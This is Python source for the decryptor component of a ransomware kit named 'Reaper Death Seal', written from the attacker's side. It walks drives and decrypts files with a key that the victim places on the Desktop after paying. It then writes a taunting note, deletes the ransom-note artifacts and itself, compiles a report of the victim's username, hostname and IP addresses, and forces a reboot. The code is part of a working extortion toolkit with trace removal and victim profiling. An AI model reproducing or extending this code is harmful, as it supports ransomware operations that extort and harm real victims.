#I want to create the decryption software for the reaper death seal ransomware
print("This file has started running \n")


#Useful libraries that I would be working with -->
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can intereact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
import win32api
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP
import base64
from threading import Thread # used for ransom note and decryption key on dekstop
import sys
#from email.message import EmailMessage
import config
import ip_info
import traceback


#Declaring the variables 
#Looping through all drives in the target machine to find all the available accessible drives that can be encrypted
def selectedDrives():
    drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
    available = []
    for drive in drives:
        try:
            if len(os.listdir(drive)) == 0:
                #print(f"{drive} directory is empty")
                pass
            else:
                #print(f"{drive} has been added to the available drives")
                available.append(drive)
        except:
            #print(f"Error in accessing {drive}")
            pass
    
    #print(available)
    return available


#Checking for the path extension
def cloudDrive(path_ext = None):
    if path_ext:
        pathExt = f"\\{path_ext}"
    else:
        try:
            cloud = os.getcwd().split('\\')[3]
        except:
            cloud = os.getcwd()
        finally:
            cloud_ = ["Drive", "Cloud", "mega", "sync"]
            for i in cloud_:
                if i in cloud: #This checks if the system files are backed up
                    #print("System is not encryptable because its files is backed up")
                    print(True)
                    #exit()
                    pathExt = f"\\{cloud}"
                    break
                else:
                    print(False)
                    pathExt = ""

            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
            print(f"Path: {os.getcwd()}")
            print(f"Cloud Path: {cloud}")
            print(f"Path Extension: {pathExt}")
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    return pathExt


#Checking if the file is in the desktop so that it can start decrypting the machine
if "Desktop" in os.getcwd():
    desktop_status = True
else:
    desktop_status = False


#This class handles the decryption of the files in the system
class reaperDeathSeal:
    def __init__(self, target, attacker, display, key = None, path_ext = None):
        self.fileExts = ["csv", 'txt', "pdf", "csv", "jpg", "r", 'doc', "png", "docx", "gif", "svg", "tif", "xlsx", 
                         "xls", "avi", "mp4", "mov", "ppt", "pptx", "odp", "key", "m4a", "mp3", "wav", "html", "ipj",
                         "xml", "eps", "psd", "ai", 'sh', "py", "c", "cpp", "css", "dart", "php", "perl", "db", "sln",
                         "sql"] # File extensions to seek out and Decrypt
        self.key = None # Key that will be used for Fernet object and encrypt/decrypt method
        self.crypter = None # Encrypter/Decrypter
        self.publicKey = None # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.drives = selectedDrives()
        self.cDrive = f"C:\\Users"
        self.decryption_key = key
        self.target = target
        self.attacker = attacker
        self.display = display
        self.datetime = datetime.datetime.now().strftime("%H:%M:%S %p. %d %B, %Y")
        self.user, self.host, self.publicIP, self.privateIP = ip_info.main()
        self.pathExt = cloudDrive(path_ext)
        #print(self.cDrive)
        self.sysRoot = os.path.expanduser('~') # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        #print(self.sysRoot)
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = f'C:\\Users\\{self.user}\\files' # Debugging/Testing
        self.report = f"""{'~' * 30} RANSOMWARE DECRYPTOR REPORT {'~' * 30}

        ~~~ Mission Details ~~~
Attacker: {self.attacker}
Target: {self.target}
Username: {self.user}
Hostname: {self.host}
Private IP: {self.privateIP}
Public IP: {self.publicIP}
Timestamp: {self.datetime}

        \n     ~~~ Mission Briefing ~~~      \n\n~~~ Decrypted File Details ~~~
 ID |           Files           |  ERROR STATUS      \n{'~' * 100}\n"""
        self.count = 1


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def cryptFile(self, filePath, encrypted = True):
        try:
            with open(filePath, 'rb') as f:
                data = f.read() # Read data from file
                if encrypted:
                    _data = self.crypter.decrypt(data) # Decrypt data from file
                    print(f'> {filePath} decrypted') # Log file decrypted and print decrypted contents - [debugging]
                error = "Success"
            with open(filePath, 'wb') as fp:
                fp.write(_data) # Write encrypted/decrypted data to file using same filename to overwrite original file
        except Exception as e:
            error = e
            print(f"Couldn't decrypt {filePath} due to [{e}]")
        finally:
            self.report += f" {self.count} |    {filePath}      |   {error}     \n"
            self.count += 1


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def cryptSystem(self, encrypted = True):
        pwd = os.getcwd()
        for drive in self.drives: 
            try:
                os.chdir(drive)
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                print(f"Current Drive: {drive}")
                print(f"CWD: {os.getcwd()}")
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                try:
                    #drive_ = os.path.expanduser("~") #This gets the sys root for each available drive
                    drive_ = f"{os.path.expanduser('~')}\\files" #This folder is for debugging the encryption functionality
                except:
                    drive_ = drive
                os.chdir(pwd)
                print(f"New Current Drive: {drive_}")
                print(f"CWD: {os.getcwd()}")
                system = os.walk(drive_, topdown = True) #Use the self.cDrive when you want to launch the ransomware
                for root, dir, files in system:
                    for file in files:
                        filePath = os.path.join(root, file)
                        if not file.split('.')[-1] in self.fileExts:
                            continue
                        if encrypted:
                            self.cryptFile(filePath, encrypted = True)
                return True
            except Exception as e:
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                print(f'Encrypting System Function Error: [{e}]')
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                return False


    # Decrypts system when text file with decrypted key in it is placed on dekstop of target machine
    def checkDesktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting the files
        print('Checking for the decryptionKey.txt')
        
        
        while True:
            try:
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
                path_ = f'{self.sysRoot}{self.pathExt}\\Desktop\\{self.target}_decryptionKey.txt'
                if os.path.exists(path_):
                    with open(path_, 'r') as f:
                        self.key = f.read()
                else:
                    if self.decryption_key:
                        if os.path.exists(self.decryption_key):
                            with open(self.decryption_key, 'r') as f:
                                self.key = f.read()
                        else:
                            self.key = bytes(self.decryption_key, "utf-8")
                    else:
                        print("No decryption key was found or passed")
                self.crypter = Fernet(self.key)

                #print(f"Crypter: {self.crypter}")
                print('Starting to decrypt the files of the target machine') # Debugging/Testing
                self.cryptSystem(encrypted = True) # Decrypt system once have file is found and we have cryptor with the correct key
                decrypted_file = f'{self.sysRoot}{self.pathExt}\\Desktop\\DECRYPTED.txt'
                if self.display:
                    with open(decrypted_file, 'w') as df:
                        df.write(f"""

            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -([[ WE ARE THE AKATSUKI ]])- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            


                    Hi {self.target}, your system has been decrypted and restored successfully. Thanks for complying
            We are sorry once again for all the inconveniences caused and promise not to attack you again.

                                Your system will be restarted in 30 seconds for complete system sanctification. Bye!

                                    """)
                else:
                    pass
                    

                print('Finished decrypting the files of the target machine') # Debugging/Testing
                print()
                error_ = f"It was a successful decryption"
                break
            except Exception as e:
                print(e) # Debugging/Testing
                error_ = f"An error occured due to [{e}]"
            finally:
                self.report += f"Briefing: {error_}"
                time.sleep(5) # Debugging/Testing check for file on desktop ever 10 seconds
            
        
        print("Deleting files from the system.. \n")
        path_ = os.getcwd().split('\\')[0]
        file = os.path.basename(sys.argv[0])
        to_path = f"{path_}\\WindowsDefender"
        file_path = [f'{self.sysRoot}{self.pathExt}\\Desktop\\RANSOM_NOTE.txt', f'{self.sysRoot}{self.pathExt}\\Desktop\\{target}_decryptionKey.txt', 
                     f'{self.sysRoot}{self.pathExt}\\Desktop\\{target}_EMAIL_ME.txt', "{to_path}\\booking_letter.docx", f"{to_path}\\license_key.txt"]

        self.report += f"\n\n     ~~~ Deletion Details ~~~  \n"
        for path in file_path:
            try:
                if os.path.exists(path) == True:
                    os.remove(path)
                    stat = "deleted"
                else:
                    stat = "not found"
                    pass
            except Exception as e:
                stat = f"error occured due to {e}"
            finally:
                name = os.path.basename(path)
                self.report += f"> {name} -- {stat} \n"
        print(f"Report has been compiled successfully")
        return decrypted_file, self.report
        


#This handles the main function of the ransomware decryptor
def main(attacker, target, display = True, key = None, path_ext = None):
    sec = 5
    print(f"Decryption will start in {sec} seconds")
    print()
    time.sleep(sec)

    try:
        rw = reaperDeathSeal(target, attacker, display, key, path_ext)
        decrypted_file, report = rw.checkDesktop()


        if desktop_status == True:
            decryptText = subprocess.Popen(['Notepad.exe', decrypted_file])
            time.sleep(8)
            decryptText.kill()
            os.remove(decrypted_file)
            print("System has been successfully decrypted by the Reaper Death Seal Ransomware Decryptor")

            print("Restarting system in 30 seconds")
            os.remove(sys.argv[0])
        
            time.sleep(30)
            os.system("shutdown /r /t  1")
        else:
            os.remove(decrypted_file)
        stat_ = "Successfully decrypted the target system"
    except Exception as e:
        stat_ = f"An error occured in ransomware decryptor due to [{e}]"
        print(stat_)
        traceback.print_exc()
    return stat_


if __name__ == "__main__":
    
    #Commencing with the code
    print("REAPER DEATH SEAL RANSOMWARE DECRYPTOR \n")
    
    attacker = r"Uchiha Minato"
    target = r"Mountain_Hotel"
    display = True
    key = None
    path_ext = "OneDrive"
    main(attacker, target, display, key, path_ext)

    print("\nExecuted successfully!!")


